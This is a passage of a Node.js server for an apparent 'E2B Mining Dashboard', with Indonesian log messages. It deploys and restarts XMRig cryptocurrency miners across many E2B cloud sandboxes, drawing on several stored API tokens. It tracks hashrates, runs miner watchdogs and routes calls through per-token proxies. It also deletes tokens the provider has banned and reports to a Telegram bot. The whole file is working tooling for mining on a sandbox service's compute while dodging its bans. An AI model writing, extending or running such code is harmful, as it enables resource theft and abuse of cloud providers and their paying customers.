    try {
      const [cloudList, listErr] = await listE2BSandboxes(t.api_key, getTokenProxy(t));
      if (listErr && isBannedReason(listErr)) {
        await deleteBannedToken(tokenId, listErr);
        return json({ ok: true, deleted: true, reason: listErr });
      }
      const cloudMap = new Map();
      for (const sb of (cloudList || [])) {
        const sid = sb.sandboxId || sb.id;
        if (sid) cloudMap.set(sid, sb);
      }
      for (const [slot, sb] of Object.entries(t.sandboxes || {})) {
        if (sb.id && !cloudMap.has(sb.id)) delete t.sandboxes[slot];
        else if (sb.id && cloudMap.has(sb.id)) {
          const cObj = cloudMap.get(sb.id);
          if (cObj.startedAt) sb.started_at = cObj.startedAt;
          if (cObj.endAt) sb.end_at = cObj.endAt;
        }
      }

      let totalHr = 0;
      const entries = Object.entries(t.sandboxes || {});
      for (let i = 0; i < entries.length; i += 5) {
        const batch = entries.slice(i, i + 5);
        await Promise.all(batch.map(async ([, sb]) => {
          if (!sb.id) return;
          const [isMining, h10, h60, h15m, notFound, wd] = await checkMiner(t.api_key, sb.id, getTokenProxy(t));
          sb.hashrate_10s = h10;
          sb.hashrate_60s = h60;
          sb.hashrate_15m = h15m;
          sb.status = isMining ? 'mining' : (h10 > 0 ? 'mining' : 'starting');
          sb.watchdog = (wd && wd.active) ? 'active' : 'restarting';
          sb.restarts = wd?.restarts || 0;
          sb.watchdog_mode = wd?.mode || 'supervisor';
          sb.last_check = new Date().toISOString();
          if (h10 > 0) totalHr += h10;
        }));
      }

      addLog(tokenId, `🔍 Check selesai (${Object.keys(t.sandboxes).length} sandbox aktif). Total: ${(totalHr / 1000).toFixed(2)} kH/s`);
      saveTokens();
      await broadcastState();
      return json({ ok: true, total_hashrate: totalHr });
    } catch (e) {
      addLog(tokenId, `❌ Check error: ${e.message}`);
      return json({ error: e.message }, 500);
    }
  }

  // POST /api/tokens/:id/restart-miner — Re-deploy Watchdog & Restart Miner di seluruh sandbox aktif
  const restartMinerMatch = pathname.match(/^\/api\/tokens\/([^/]+)\/restart-miner$/);
  if (req.method === 'POST' && restartMinerMatch) {
    const tokenId = restartMinerMatch[1];
    if (!tokens[tokenId]) return json({ error: 'Token not found' }, 404);
    const t = tokens[tokenId];
    const key = (t.api_key || '').trim();
    if (!key) return json({ error: 'API Key belum diisi' }, 400);

    const curWallet = t.config?.wallet || getActiveWallet() || FALLBACK_WALLET;
    const curCpuPercent = t.config?.cpu_percent || DEFAULT_CPU_PERCENT;
    const curExecMode = t.config?.exec_mode || DEFAULT_EXEC_MODE;
    const curMinerType = t.config?.miner_type || DEFAULT_MINER_TYPE;
    let tokenProxy = getTokenProxy(t);

    addLog(tokenId, `🔄 Me-restart miner & memperbarui konfigurasi di ${Object.keys(t.sandboxes || {}).length} sandbox aktif (XMRig)...`);

    const entries = Object.entries(t.sandboxes || {});
    (async () => {
      for (let i = 0; i < entries.length; i += 5) {
        const batch = entries.slice(i, i + 5);
        await Promise.all(batch.map(async ([slot, sb]) => {
          if (!sb.id) return;
          try {
            await setupMiner(key, sb.id, curWallet, curCpuPercent, curExecMode, tokenProxy, curMinerType);
            sb.status = 'starting';
            sb.miner_type = curMinerType;
            sb.cpu_percent = curCpuPercent;
            sb.threads = cpuPercentToThreads(curCpuPercent);
            addLog(tokenId, `✓ [Slot ${String(slot).padStart(2, '0')}] Miner di-restart (SSL Port 443).`);
          } catch (e) {
            console.error(`Gagal restart miner di slot ${slot}:`, e.message);
          }
        }));
        await broadcastState();
      }
      addLog(tokenId, `✅ Seluruh container telah di-restart dengan konfigurasi miner terbaru!`);
      saveTokens();
      await broadcastState();
    })().catch(() => {});

    return json({ ok: true, message: 'Restart miner sedang berjalan di latar belakang.' });
  }

  // POST /api/tokens/:id/kill-all — Hapus semua sandbox di E2B
  const killMatch = pathname.match(/^\/api\/tokens\/([^/]+)\/kill-all$/);
  if (req.method === 'POST' && killMatch) {
    const tokenId = killMatch[1];
    if (!tokens[tokenId]) return json({ error: 'Token not found' }, 404);
    const t = tokens[tokenId];
    if (tasks[tokenId]) tasks[tokenId].cancel = true;
    addLog(tokenId, '🗑️ Menghapus semua sandbox E2B...');
    let killed = 0;
    for (const [slot, sb] of Object.entries(t.sandboxes || {})) {
      if (sb.id) {
        const ok = await killE2BSandbox(t.api_key, sb.id, getTokenProxy(t));
        if (ok) { killed++; delete t.sandboxes[slot]; }
      }
    }
    addLog(tokenId, `✅ ${killed} sandbox berhasil ditutup.`);
    saveTokens();
    await broadcastState();
    return json({ ok: true, killed });
  }

  // POST /api/tokens/:id/kill-inactive — Hapus sandbox E2B yang tidak Mining Active
  const killInactiveMatch = pathname.match(/^\/api\/tokens\/([^/]+)\/kill-inactive$/);
  if (req.method === 'POST' && killInactiveMatch) {
    const tokenId = killInactiveMatch[1];
    if (!tokens[tokenId]) return json({ error: 'Token not found' }, 404);
    const t = tokens[tokenId];
    addLog(tokenId, '🧹 Menghapus sandbox yang tidak aktif...');
    let killed = 0;
    for (const [slot, sb] of Object.entries(t.sandboxes || {})) {
      if (sb.id && sb.status !== 'mining') {
        const ok = await killE2BSandbox(t.api_key, sb.id, getTokenProxy(t));
        if (ok) { killed++; delete t.sandboxes[slot]; }
      }
    }
    addLog(tokenId, `✅ ${killed} sandbox tidak aktif berhasil ditutup.`);
    saveTokens();
    await broadcastState();
    return json({ ok: true, killed });
  }

  // POST /api/tokens/:id/kill-single/:sandboxId — Hapus satu sandbox
  const killSingleMatch = pathname.match(/^\/api\/tokens\/([^/]+)\/kill-single\/([^/]+)$/);
  if (req.method === 'POST' && killSingleMatch) {
    const tokenId = killSingleMatch[1];
    const sandboxId = killSingleMatch[2];
    if (!tokens[tokenId]) return json({ error: 'Token not found' }, 404);
    const t = tokens[tokenId];
    addLog(tokenId, `🗑️ Menghapus sandbox ${sandboxId.slice(0, 16)}...`);
    const ok = await killE2BSandbox(t.api_key, sandboxId, getTokenProxy(t));
    if (ok) {
      for (const [slot, sb] of Object.entries(t.sandboxes || {})) {
        if (sb.id === sandboxId) {
          delete t.sandboxes[slot];
          break;
        }
      }
      addLog(tokenId, `✅ Sandbox ${sandboxId.slice(0, 16)} berhasil ditutup.`);
      saveTokens();
      await broadcastState();
      return json({ ok: true });
    }
    return json({ error: 'Failed to kill sandbox' }, 500);
  }

  // ---- STATIC FILES (SPA) ----
  const staticDir = path.join(__dirname, 'static');
  let filePath = pathname === '/'
    ? path.join(staticDir, 'index.html')
    : path.join(staticDir, pathname);

  if (!filePath.startsWith(staticDir)) { res.writeHead(403); res.end('Forbidden'); return; }
  if (!fs.existsSync(filePath)) filePath = path.join(staticDir, 'index.html');

  if (fs.existsSync(filePath)) {
    const ext = path.extname(filePath);
    const mime = {
      '.html': 'text/html', '.js': 'application/javascript',
      '.css': 'text/css', '.json': 'application/json',
      '.png': 'image/png', '.svg': 'image/svg+xml'
    };
    if (ext === '.html') {
      try {
        let content = fs.readFileSync(filePath, 'utf-8');
        const curWallet = getActiveWallet();
        content = content.replace(/id="inputWallet"\s+value="[^"]*"/g, `id="inputWallet" value="${escapeHtml(curWallet)}"`);
        content = content.replace(/id="inputBulkWallet"\s+value="[^"]*"/g, `id="inputBulkWallet" value="${escapeHtml(curWallet)}"`);
        content = content.replace(/id="displayActiveWallet">[^<]*</g, `id="displayActiveWallet">${escapeHtml(curWallet)}<`);
        res.writeHead(200, {
          'Content-Type': 'text/html; charset=utf-8',
          'Cache-Control': 'no-cache, no-store, must-revalidate'
        });
        res.end(content);
        return;
      } catch (e) {
        console.error('[SERVE HTML ERROR]', e.message);
      }
    }
    res.writeHead(200, { 'Content-Type': mime[ext] || 'text/plain' });
    fs.createReadStream(filePath).pipe(res);
  } else {
    res.writeHead(404);
    res.end('Not Found');
  }
}

// ============================================================
// STARTUP
// ============================================================

async function main() {
  const loaded = loadTokens();
  for (const [tid, t] of Object.entries(loaded)) {
    tokens[tid] = t;
    logs[tid] = [];
    console.log(`Token E2B '${t.name}' dimuat dari penyimpanan.`);
  }
  const tokenIds = Object.keys(loaded);
  if (!tokenIds.length) {
    console.log('[STARTUP] Belum ada E2B token tersimpan. Buka dashboard di browser untuk menambahkan.');
  } else {
    console.log(`[STARTUP] Memasukkan ${tokenIds.length} token ke antrian sequensial (bulk 1-by-1)...`);
    for (const tid of tokenIds) {
      if (tokens[tid].api_key) {
        enqueueToken(tid);
      }
    }
  }

  const server = http.createServer(handleRequest);
  const wss = new WebSocketServer({ server });
  wss.on('connection', ws => {
    wsClients.add(ws);
    ws.send(JSON.stringify({
      type: 'state',
      rdp_name: RDP_NAME,
      wallet: getActiveWallet(),
      miner: getActiveMiner(),
      use_proxy: isProxyEnabled(),
      tokens: getAllTokensSummary()
    }));
    ws.on('close', () => wsClients.delete(ws));
    ws.on('error', () => wsClients.delete(ws));
  });

  server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n===============================================================`);
    console.log(`🚀 E2B Mining Dashboard berjalan di: http://localhost:${PORT}`);
    console.log(`🖥️  RDP / Host: ${RDP_NAME} (Hostname: ${os.hostname()})`);
    console.log(`⚙️  Platform : E2B Custom Sandboxes`);
    console.log(`💻 Hardware : 8 vCPU / 8 GB RAM per Sandbox (Mining CPU: Configurable 1%-100%, Native Watchdog Supervisor)`);
    console.log(`🔨 Build    : Auto-builds custom template via Template.build()`);
    console.log(`💰 Wallet   : ${getActiveWallet()} (dari config.json)`);
    console.log(`🤖 Telegram : Bot @LogsE2BS_Bot aktif (Chat ID: ${TELEGRAM_CHAT_ID})`);
    console.log(`===============================================================\n`);
  });
}

main().catch(err => {
  console.error('[FATAL]', err);
  process.exit(1);
});
